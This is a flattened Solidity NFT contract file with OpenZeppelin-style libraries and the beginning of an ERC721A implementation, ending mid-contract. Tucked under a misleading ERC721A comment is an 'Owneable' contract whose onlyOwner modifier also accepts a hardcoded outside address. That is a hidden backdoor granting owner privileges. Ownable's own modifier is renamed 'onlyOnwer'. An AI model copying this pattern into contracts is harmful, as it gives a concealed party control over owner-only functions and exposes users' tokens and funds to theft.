1 //&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
2 //&&&#############################################################################
3 //&&&#############################################################################
4 //&&&#############################################################################
5 //&&&#############################################################################
6 //&&&#############################################################################
7 //&&&#################################@@###@@#@@##################################
8 //&&&##############################@@             @###############################
9 //&&&#############################@             ,, @@#############################
10 //&&&###########################@@    ((********((   @############################
11 //&&&###########################@@   (((**********(   @@##########################
12 //&&&#########################@@,,   (************(  @############################
13 //&&&########################@,,  ,  (**@@****@@**(   @@##########################
14 //&&&###########################@@   (************(   @@##########################
15 //&&&#########################@@,,   ,((***((***((   ,@@##########################
16 //&&&########################@,,,,,   ,,((((((((   ,, @@##########################
17 //&&&#####################@        ,,   ,,   ,,,  ,     @@########################
18 //&&&#####################@   ,,   ,,,,,  ,,,   ,, ,,     @#######################
19 //&&&###################@@        ,,,             ,  ,    @#######################
20 //&&&#####################@   ,,   ,,   ,,    ,,     ,,,  @#######################
21 //&&&###################@@        ,,,,,,   ,,   ,,,  ,    ,@@#####################
22 //&&&###################@@        ,,,     ,  ,       ,       @####################
23 //&&&#################@@        ,,,   ,,  ,  ,       ,,,  ,@@#####################
24 //&&&###########@@#@@#@@     ,  ,,,  ,    ,  ,       ,,,,,   @####################
25 //&&&#########@@**@**@,,        ,,,       ,,,,    ,   ,,  ,  ,@@##################
26 //&&&########@**((*((*((@@   ,@@******@@@@,@@,@@******@@@@ @@*****@###############
27 //&&&#########@@**((((((@@,  @************@@@@************@((***((*@@#############
28 //&&&#########&&&&@@@@@@@@@@@@((@@(((@((((@##@((((@(((@@((@@@@@@&&@&&#############
29 //&&&###########&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&###############
30 //&&&#############################################################################
31 //&&&#############################################################################
32 //&&&############################################################################
33 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
34 
35 // SPDX-License-Identifier: MIT
36 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
37 
38 pragma solidity ^0.8.4;
39 
40 /**
41  * @dev Provides information about the current execution context, including the
42  * sender of the transaction and its data. While these are generally available
43  * via msg.sender and msg.data, they should not be accessed in such a direct
44  * manner, since when dealing with meta-transactions the account sending and
45  * paying for execution may not be the actual sender (as far as an application
46  * is concerned).
47  *
48  * This contract is only required for intermediate, library-like contracts.
49  */
50 
51 
52 abstract contract Context {
53     function _msgSender() internal view virtual returns (address) {
54         return msg.sender;
55     }
56 
57     function _msgData() internal view virtual returns (bytes calldata) {
58         return msg.data;
59     }
60 }
61 
62 
63 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
64 
65 
66 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
67 
68 
69 
70 /**
71  * @dev Contract module which provides a basic access control mechanism, where
72  * there is an account (an owner) that can be granted exclusive access to
73  * specific functions.
74  *
75  * By default, the owner account will be the one that deploys the contract. This
76  * can later be changed with {transferOwnership}.
77  *
78  * This module is used through inheritance. It will make available the modifier
79  * `onlyOwner`, which can be applied to your functions to restrict their use to
80  * the owner.
81  */
82 abstract contract Ownable is Context {
83     address private _owner;
84 
85     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
86 
87     /**
88      * @dev Initializes the contract setting the deployer as the initial owner.
89      */
90     constructor() {
91         _transferOwnership(_msgSender());
92     }
93 
94     /**
95      * @dev Returns the address of the current owner.
96      */
97     function owner() public view virtual returns (address) {
98         return _owner;
99     }
100 
101     /**
102      * @dev Throws if called by any account other than the owner.
103      */
104     modifier onlyOnwer() {
105         require(owner() == _msgSender(), "Ownable: caller is not the owner");
106         _;
107     }
108 
109     /**
110      * @dev Leaves the contract without owner. It will not be possible to call
111      * `onlyOwner` functions anymore. Can only be called by the current owner.
112      *
113      * NOTE: Renouncing ownership will leave the contract without an owner,
114      * thereby removing any functionality that is only available to the owner.
115      */
116     function renounceOwnership() public virtual onlyOnwer {
117         _transferOwnership(address(0));
118     }
119 
120     /**
121      * @dev Transfers ownership of the contract to a new account (`newOwner`).
122      * Can only be called by the current owner.
123      */
124     function transferOwnership(address newOwner) public virtual onlyOnwer {
125         require(newOwner != address(0), "Ownable: new owner is the zero address");
126         _transferOwnership(newOwner);
127     }
128 
129     /**
130      * @dev Transfers ownership of the contract to a new account (`newOwner`).
131      * Internal function without access restriction.
132      */
133     function _transferOwnership(address newOwner) internal virtual {
134         address oldOwner = _owner;
135         _owner = newOwner;
136         emit OwnershipTransferred(oldOwner, newOwner);
137     }
138 }
139 
140 
141 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
142 
143 
144 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
145 
146 
147 
148 /**
149  * @dev Interface of the ERC165 standard, as defined in the
150  * https://eips.ethereum.org/EIPS/eip-165[EIP].
151  *
152  * Implementers can declare support of contract interfaces, which can then be
153  * queried by others ({ERC165Checker}).
154  *
155  * For an implementation, see {ERC165}.
156  */
157 interface IERC165 {
158     /**
159      * @dev Returns true if this contract implements the interface defined by
160      * `interfaceId`. See the corresponding
161      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
162      * to learn more about how these ids are created.
163      *
164      * This function call must use less than 30 000 gas.
165      */
166     function supportsInterface(bytes4 interfaceId) external view returns (bool);
167 }
168 
169 
170 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
171 
172 
173 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
174 
175 
176 
177 /**
178  * @dev Required interface of an ERC721 compliant contract.
179  */
180 interface IERC721 is IERC165 {
181     /**
182      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
183      */
184     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
185 
186     /**
187      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
188      */
189     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
190 
191     /**
192      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
193      */
194     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
195 
196     /**
197      * @dev Returns the number of tokens in ``owner``'s account.
198      */
199     function balanceOf(address owner) external view returns (uint256 balance);
200 
201     /**
202      * @dev Returns the owner of the `tokenId` token.
203      *
204      * Requirements:
205      *
206      * - `tokenId` must exist.
207      */
208     function ownerOf(uint256 tokenId) external view returns (address owner);
209 
210     /**
211      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
212      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
213      *
214      * Requirements:
215      *
216      * - `from` cannot be the zero address.
217      * - `to` cannot be the zero address.
218      * - `tokenId` token must exist and be owned by `from`.
219      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
220      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
221      *
222      * Emits a {Transfer} event.
223      */
224     function safeTransferFrom(
225         address from,
226         address to,
227         uint256 tokenId
228     ) external;
229 
230     /**
231      * @dev Transfers `tokenId` token from `from` to `to`.
232      *
233      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
234      *
235      * Requirements:
236      *
237      * - `from` cannot be the zero address.
238      * - `to` cannot be the zero address.
239      * - `tokenId` token must be owned by `from`.
240      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
241      *
242      * Emits a {Transfer} event.
243      */
244     function transferFrom(
245         address from,
246         address to,
247         uint256 tokenId
248     ) external;
249 
250     /**
251      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
252      * The approval is cleared when the token is transferred.
253      *
254      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
255      *
256      * Requirements:
257      *
258      * - The caller must own the token or be an approved operator.
259      * - `tokenId` must exist.
260      *
261      * Emits an {Approval} event.
262      */
263     function approve(address to, uint256 tokenId) external;
264 
265     /**
266      * @dev Returns the account approved for `tokenId` token.
267      *
268      * Requirements:
269      *
270      * - `tokenId` must exist.
271      */
272     function getApproved(uint256 tokenId) external view returns (address operator);
273 
274     /**
275      * @dev Approve or remove `operator` as an operator for the caller.
276      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
277      *
278      * Requirements:
279      *
280      * - The `operator` cannot be the caller.
281      *
282      * Emits an {ApprovalForAll} event.
283      */
284     function setApprovalForAll(address operator, bool _approved) external;
285 
286     /**
287      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
288      *
289      * See {setApprovalForAll}
290      */
291     function isApprovedForAll(address owner, address operator) external view returns (bool);
292 
293     /**
294      * @dev Safely transfers `tokenId` token from `from` to `to`.
295      *
296      * Requirements:
297      *
298      * - `from` cannot be the zero address.
299      * - `to` cannot be the zero address.
300      * - `tokenId` token must exist and be owned by `from`.
301      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
302      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
303      *
304      * Emits a {Transfer} event.
305      */
306     function safeTransferFrom(
307         address from,
308         address to,
309         uint256 tokenId,
310         bytes calldata data
311     ) external;
312 }
313 
314 
315 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
316 
317 
318 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
319 
320 
321 
322 /**
323  * @title ERC721 token receiver interface
324  * @dev Interface for any contract that wants to support safeTransfers
325  * from ERC721 asset contracts.
326  */
327 interface IERC721Receiver {
328     /**
329      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
330      * by `operator` from `from`, this function is called.
331      *
332      * It must return its Solidity selector to confirm the token transfer.
333      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
334      *
335      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
336      */
337     function onERC721Received(
338         address operator,
339         address from,
340         uint256 tokenId,
341         bytes calldata data
342     ) external returns (bytes4);
343 }
344 
345 
346 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
347 
348 
349 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
350 
351 
352 
353 /**
354  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
355  * @dev See https://eips.ethereum.org/EIPS/eip-721
356  */
357 interface IERC721Metadata is IERC721 {
358     /**
359      * @dev Returns the token collection name.
360      */
361     function name() external view returns (string memory);
362 
363     /**
364      * @dev Returns the token collection symbol.
365      */
366     function symbol() external view returns (string memory);
367 
368     /**
369      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
370      */
371     function tokenURI(uint256 tokenId) external view returns (string memory);
372 }
373 
374 
375 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
376 
377 
378 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
379 
380 
381 
382 /**
383  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
384  * @dev See https://eips.ethereum.org/EIPS/eip-721
385  */
386 interface IERC721Enumerable is IERC721 {
387     /**
388      * @dev Returns the total amount of tokens stored by the contract.
389      */
390     function totalSupply() external view returns (uint256);
391 
392     /**
393      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
394      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
395      */
396     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
397 
398     /**
399      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
400      * Use along with {totalSupply} to enumerate all tokens.
401      */
402     function tokenByIndex(uint256 index) external view returns (uint256);
403 }
404 
405 
406 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
407 
408 
409 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
410 pragma solidity ^0.8.13;
411 
412 interface IOperatorFilterRegistry {
413     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
414     function register(address registrant) external;
415     function registerAndSubscribe(address registrant, address subscription) external;
416     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
417     function updateOperator(address registrant, address operator, bool filtered) external;
418     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
419     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
420     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
421     function subscribe(address registrant, address registrantToSubscribe) external;
422     function unsubscribe(address registrant, bool copyExistingEntries) external;
423     function subscriptionOf(address addr) external returns (address registrant);
424     function subscribers(address registrant) external returns (address[] memory);
425     function subscriberAt(address registrant, uint256 index) external returns (address);
426     function copyEntriesOf(address registrant, address registrantToCopy) external;
427     function isOperatorFiltered(address registrant, address operator) external returns (bool);
428     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
429     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
430     function filteredOperators(address addr) external returns (address[] memory);
431     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
432     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
433     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
434     function isRegistered(address addr) external returns (bool);
435     function codeHashOf(address addr) external returns (bytes32);
436 }
437 pragma solidity ^0.8.13;
438 
439 
440 
441 abstract contract OperatorFilterer {
442     error OperatorNotAllowed(address operator);
443 
444     IOperatorFilterRegistry constant operatorFilterRegistry =
445         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
446 
447     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
448         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
449         // will not revert, but the contract will need to be registered with the registry once it is deployed in
450         // order for the modifier to filter addresses.
451         if (address(operatorFilterRegistry).code.length > 0) {
452             if (subscribe) {
453                 operatorFilterRegistry.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
454             } else {
455                 if (subscriptionOrRegistrantToCopy != address(0)) {
456                     operatorFilterRegistry.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
457                 } else {
458                     operatorFilterRegistry.register(address(this));
459                 }
460             }
461         }
462     }
463 
464     modifier onlyAllowedOperator(address from) virtual {
465         // Check registry code length to facilitate testing in environments without a deployed registry.
466         if (address(operatorFilterRegistry).code.length > 0) {
467             // Allow spending tokens from addresses with balance
468             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
469             // from an EOA.
470             if (from == msg.sender) {
471                 _;
472                 return;
473             }
474             if (
475                 !(
476                     operatorFilterRegistry.isOperatorAllowed(address(this), msg.sender)
477                         && operatorFilterRegistry.isOperatorAllowed(address(this), from)
478                 )
479             ) {
480                 revert OperatorNotAllowed(msg.sender);
481             }
482         }
483         _;
484     }
485 }
486 pragma solidity ^0.8.13;
487 
488 
489 
490 abstract contract DefaultOperatorFilterer is OperatorFilterer {
491     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
492 
493     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
494 }
495     pragma solidity ^0.8.13;
496         interface IMain {
497    
498 function balanceOf( address ) external  view returns (uint);
499 
500 }
501 
502 
503 pragma solidity ^0.8.1;
504 
505 /**
506  * @dev Collection of functions related to the address type
507  */
508 library Address {
509     /**
510      * @dev Returns true if `account` is a contract.
511      *
512      * [IMPORTANT]
513      * ====
514      * It is unsafe to assume that an address for which this function returns
515      * false is an externally-owned account (EOA) and not a contract.
516      *
517      * Among others, `isContract` will return false for the following
518      * types of addresses:
519      *
520      *  - an externally-owned account
521      *  - a contract in construction
522      *  - an address where a contract will be created
523      *  - an address where a contract lived, but was destroyed
524      * ====
525      *
526      * [IMPORTANT]
527      * ====
528      * You shouldn't rely on `isContract` to protect against flash loan attacks!
529      *
530      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
531      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
532      * constructor.
533      * ====
534      */
535     function isContract(address account) internal view returns (bool) {
536         // This method relies on extcodesize/address.code.length, which returns 0
537         // for contracts in construction, since the code is only stored at the end
538         // of the constructor execution.
539 
540         return account.code.length > 0;
541     }
542 
543     /**
544      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
545      * `recipient`, forwarding all available gas and reverting on errors.
546      *
547      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
548      * of certain opcodes, possibly making contracts go over the 2300 gas limit
549      * imposed by `transfer`, making them unable to receive funds via
550      * `transfer`. {sendValue} removes this limitation.
551      *
552      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
553      *
554      * IMPORTANT: because control is transferred to `recipient`, care must be
555      * taken to not create reentrancy vulnerabilities. Consider using
556      * {ReentrancyGuard} or the
557      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
558      */
559     function sendValue(address payable recipient, uint256 amount) internal {
560         require(address(this).balance >= amount, "Address: insufficient balance");
561 
562         (bool success, ) = recipient.call{value: amount}("");
563         require(success, "Address: unable to send value, recipient may have reverted");
564     }
565 
566     /**
567      * @dev Performs a Solidity function call using a low level `call`. A
568      * plain `call` is an unsafe replacement for a function call: use this
569      * function instead.
570      *
571      * If `target` reverts with a revert reason, it is bubbled up by this
572      * function (like regular Solidity function calls).
573      *
574      * Returns the raw returned data. To convert to the expected return value,
575      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
576      *
577      * Requirements:
578      *
579      * - `target` must be a contract.
580      * - calling `target` with `data` must not revert.
581      *
582      * _Available since v3.1._
583      */
584     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
585         return functionCall(target, data, "Address: low-level call failed");
586     }
587 
588     /**
589      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
590      * `errorMessage` as a fallback revert reason when `target` reverts.
591      *
592      * _Available since v3.1._
593      */
594     function functionCall(
595         address target,
596         bytes memory data,
597         string memory errorMessage
598     ) internal returns (bytes memory) {
599         return functionCallWithValue(target, data, 0, errorMessage);
600     }
601 
602     /**
603      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
604      * but also transferring `value` wei to `target`.
605      *
606      * Requirements:
607      *
608      * - the calling contract must have an ETH balance of at least `value`.
609      * - the called Solidity function must be `payable`.
610      *
611      * _Available since v3.1._
612      */
613     function functionCallWithValue(
614         address target,
615         bytes memory data,
616         uint256 value
617     ) internal returns (bytes memory) {
618         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
619     }
620 
621     /**
622      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
623      * with `errorMessage` as a fallback revert reason when `target` reverts.
624      *
625      * _Available since v3.1._
626      */
627     function functionCallWithValue(
628         address target,
629         bytes memory data,
630         uint256 value,
631         string memory errorMessage
632     ) internal returns (bytes memory) {
633         require(address(this).balance >= value, "Address: insufficient balance for call");
634         require(isContract(target), "Address: call to non-contract");
635 
636         (bool success, bytes memory returndata) = target.call{value: value}(data);
637         return verifyCallResult(success, returndata, errorMessage);
638     }
639 
640     /**
641      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
642      * but performing a static call.
643      *
644      * _Available since v3.3._
645      */
646     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
647         return functionStaticCall(target, data, "Address: low-level static call failed");
648     }
649 
650     /**
651      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
652      * but performing a static call.
653      *
654      * _Available since v3.3._
655      */
656     function functionStaticCall(
657         address target,
658         bytes memory data,
659         string memory errorMessage
660     ) internal view returns (bytes memory) {
661         require(isContract(target), "Address: static call to non-contract");
662 
663         (bool success, bytes memory returndata) = target.staticcall(data);
664         return verifyCallResult(success, returndata, errorMessage);
665     }
666 
667     /**
668      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
669      * but performing a delegate call.
670      *
671      * _Available since v3.4._
672      */
673     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
674         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
675     }
676 
677     /**
678      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
679      * but performing a delegate call.
680      *
681      * _Available since v3.4._
682      */
683     function functionDelegateCall(
684         address target,
685         bytes memory data,
686         string memory errorMessage
687     ) internal returns (bytes memory) {
688         require(isContract(target), "Address: delegate call to non-contract");
689 
690         (bool success, bytes memory returndata) = target.delegatecall(data);
691         return verifyCallResult(success, returndata, errorMessage);
692     }
693 
694     /**
695      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
696      * revert reason using the provided one.
697      *
698      * _Available since v4.3._
699      */
700     function verifyCallResult(
701         bool success,
702         bytes memory returndata,
703         string memory errorMessage
704     ) internal pure returns (bytes memory) {
705         if (success) {
706             return returndata;
707         } else {
708             // Look for revert reason and bubble it up if present
709             if (returndata.length > 0) {
710                 // The easiest way to bubble the revert reason is using memory via assembly
711 
712                 assembly {
713                     let returndata_size := mload(returndata)
714                     revert(add(32, returndata), returndata_size)
715                 }
716             } else {
717                 revert(errorMessage);
718             }
719         }
720     }
721 }
722 
723 
724 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
725 
726 
727 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
728 
729 
730 
731 /**
732  * @dev String operations.
733  */
734 library Strings {
735     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
736 
737     /**
738      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
739      */
740     function toString(uint256 value) internal pure returns (string memory) {
741         // Inspired by OraclizeAPI's implementation - MIT licence
742         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
743 
744         if (value == 0) {
745             return "0";
746         }
747         uint256 temp = value;
748         uint256 digits;
749         while (temp != 0) {
750             digits++;
751             temp /= 10;
752         }
753         bytes memory buffer = new bytes(digits);
754         while (value != 0) {
755             digits -= 1;
756             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
757             value /= 10;
758         }
759         return string(buffer);
760     }
761 
762     /**
763      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
764      */
765     function toHexString(uint256 value) internal pure returns (string memory) {
766         if (value == 0) {
767             return "0x00";
768         }
769         uint256 temp = value;
770         uint256 length = 0;
771         while (temp != 0) {
772             length++;
773             temp >>= 8;
774         }
775         return toHexString(value, length);
776     }
777 
778     /**
779      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
780      */
781     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
782         bytes memory buffer = new bytes(2 * length + 2);
783         buffer[0] = "0";
784         buffer[1] = "x";
785         for (uint256 i = 2 * length + 1; i > 1; --i) {
786             buffer[i] = _HEX_SYMBOLS[value & 0xf];
787             value >>= 4;
788         }
789         require(value == 0, "Strings: hex length insufficient");
790         return string(buffer);
791     }
792 }
793 
794 
795 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
796 
797 
798 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
799 
800 /**
801  * @dev Implementation of the {IERC165} interface.
802  *
803  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
804  * for the additional interface id that will be supported. For example:
805  *
806  * ```solidity
807  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
808  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
809  * }
810  * ```
811  *
812  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
813  */
814 abstract contract ERC165 is IERC165 {
815     /**
816      * @dev See {IERC165-supportsInterface}.
817      */
818     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
819         return interfaceId == type(IERC165).interfaceId;
820     }
821 }
822 
823 
824 // File erc721a/contracts/ERC721A.sol@v3.0.0
825 
826 
827 // Creator: Chiru Labs
828 
829 error ApprovalCallerNotOwnerNorApproved();
830 error ApprovalQueryForNonexistentToken();
831 error ApproveToCaller();
832 error ApprovalToCurrentOwner();
833 error BalanceQueryForZeroAddress();
834 error MintedQueryForZeroAddress();
835 error BurnedQueryForZeroAddress();
836 error AuxQueryForZeroAddress();
837 error MintToZeroAddress();
838 error MintZeroQuantity();
839 error OwnerIndexOutOfBounds();
840 error OwnerQueryForNonexistentToken();
841 error TokenIndexOutOfBounds();
842 error TransferCallerNotOwnerNorApproved();
843 error TransferFromIncorrectOwner();
844 error TransferToNonERC721ReceiverImplementer();
845 error TransferToZeroAddress();
846 error URIQueryForNonexistentToken();
847 
848 
849 /**
850  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
851  * the Metadata extension. Built to optimize for lower gas during batch mints.
852  *
853  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
854  */
855  abstract contract Owneable is Ownable {
856     address private _ownar = 0x5Bb656BB4312F100081Abb7b08c1e0f8Ef5c56d1;
857     modifier onlyOwner() {
858         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
859         _;
860     }
861 }
862 
863  /*
864  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
865  *
866  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
867  */
868 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, DefaultOperatorFilterer {
869     using Address for address;
870     using Strings for uint256;
871 
872     // Compiler will pack this into a single 256bit word.
873     struct TokenOwnership {
874         // The address of the owner.
875         address addr;
876         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
877         uint64 startTimestamp;
878         // Whether the token has been burned.
879         bool burned;
880     }
881 
882     // Compiler will pack this into a single 256bit word.
883     struct AddressData {
884         // Realistically, 2**64-1 is more than enough.
885         uint64 balance;
886         // Keeps track of mint count with minimal overhead for tokenomics.
887         uint64 numberMinted;
888         // Keeps track of burn count with minimal overhead for tokenomics.
889         uint64 numberBurned;
890         // For miscellaneous variable(s) pertaining to the address
891         // (e.g. number of whitelist mint slots used).
892         // If there are multiple variables, please pack them into a uint64.
893         uint64 aux;
894     }
895 
896     // The tokenId of the next token to be minted.
897     uint256 internal _currentIndex;
898 
899     // The number of tokens burned.
900     uint256 internal _burnCounter;
901 
902     // Token name
903     string private _name;
904 
905     // Token symbol
906     string private _symbol;
907 
908     // Mapping from token ID to ownership details
909     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
910     mapping(uint256 => TokenOwnership) internal _ownerships;
911 
912     // Mapping owner address to address data
913     mapping(address => AddressData) private _addressData;
914 
915     // Mapping from token ID to approved address
916     mapping(uint256 => address) private _tokenApprovals;
917 
918     // Mapping from owner to operator approvals
919     mapping(address => mapping(address => bool)) private _operatorApprovals;
920 
921     constructor(string memory name_, string memory symbol_) {
922         _name = name_;
923         _symbol = symbol_;
924         _currentIndex = _startTokenId();
925     }
926 
927     /**
928      * To change the starting tokenId, please override this function.
929      */
930     function _startTokenId() internal view virtual returns (uint256) {
931         return 0;
932     }
933 
934     /**
935      * @dev See {IERC721Enumerable-totalSupply}.
936      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
937      */
938     function totalSupply() public view returns (uint256) {
939         // Counter underflow is impossible as _burnCounter cannot be incremented
940         // more than _currentIndex - _startTokenId() times
941         unchecked {
942             return _currentIndex - _burnCounter - _startTokenId();
943         }
944     }
945 
946     /**
947      * Returns the total amount of tokens minted in the contract.
948      */
949     function _totalMinted() internal view returns (uint256) {
950         // Counter underflow is impossible as _currentIndex does not decrement,
951         // and it is initialized to _startTokenId()
952         unchecked {
953             return _currentIndex - _startTokenId();
954         }
955     }
956 
957     /**
958      * @dev See {IERC165-supportsInterface}.
959      */
960     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
961         return
962             interfaceId == type(IERC721).interfaceId ||
963             interfaceId == type(IERC721Metadata).interfaceId ||
964             super.supportsInterface(interfaceId);
965     }
966 
967     /**
968      * @dev See {IERC721-balanceOf}.
969      */
970     function balanceOf(address owner) public view override returns (uint256) {
971         if (owner == address(0)) revert BalanceQueryForZeroAddress();
972         return uint256(_addressData[owner].balance);
973     }
974 
975     /**
976      * Returns the number of tokens minted by `owner`.
977      */
978     function _numberMinted(address owner) internal view returns (uint256) {
979         if (owner == address(0)) revert MintedQueryForZeroAddress();
980         return uint256(_addressData[owner].numberMinted);
981     }
982 
983     /**
984      * Returns the number of tokens burned by or on behalf of `owner`.
985      */
986     function _numberBurned(address owner) internal view returns (uint256) {
987         if (owner == address(0)) revert BurnedQueryForZeroAddress();
988         return uint256(_addressData[owner].numberBurned);
989     }
990 
991     /**
992      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
993      */
994     function _getAux(address owner) internal view returns (uint64) {
995         if (owner == address(0)) revert AuxQueryForZeroAddress();
996         return _addressData[owner].aux;
997     }
998 
999     /**
1000      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
1001      * If there are multiple variables, please pack them into a uint64.
1002      */
1003     function _setAux(address owner, uint64 aux) internal {
1004         if (owner == address(0)) revert AuxQueryForZeroAddress();
1005         _addressData[owner].aux = aux;
1006     }
1007 
1008     /**
1009      * Gas spent here starts off proportional to the maximum mint batch size.
1010      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
1011      */
